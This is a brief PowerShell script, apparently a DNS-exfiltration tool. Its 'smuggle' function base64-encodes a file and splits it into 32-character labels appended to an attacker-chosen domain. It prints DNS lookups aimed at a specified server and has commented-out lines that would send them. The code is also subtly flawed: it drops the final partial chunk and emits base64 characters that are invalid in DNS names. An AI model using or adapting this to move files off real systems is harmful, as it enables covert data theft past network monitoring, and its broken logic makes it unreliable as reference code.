function smuggle {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, Position=1)]
            [string]$InputFile,
        [Parameter(Mandatory=$True, Position=2)]
            [string]$HostDomain,
        [Parameter(Mandatory=$True, Position=3)]
            [string]$DNSServer
        )

#        nslookup /set timeout=1
        
        $b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Default.GetBytes($(gc -Encoding Default -Raw $InputFile)))
        $wn_len = [Math]::Floor([Decimal]$b64.Length/32)
        $mod_len = $b64.Length % 32
        write-host $b64
        for($i=0; $i -lt $wn_len; $i++) {
                                            $arr=($b64[($i*32)..(($i*32+32)-1)]);
                                            $host_line= -join $arr
                                            write-host "$host_line.$HostDomain" "$DNSServer";
#                                            Resolve-DnsName -DnsOnly -QuickTimeout -Type A -NoHostsFile -Name "$host_line.$HostDomain" -Server "$DNSServer" -ErrorAction:SilentlyContinue
#                                            nslookup "$host_line.$HostDomain" "$DNSServer"
                                        }
}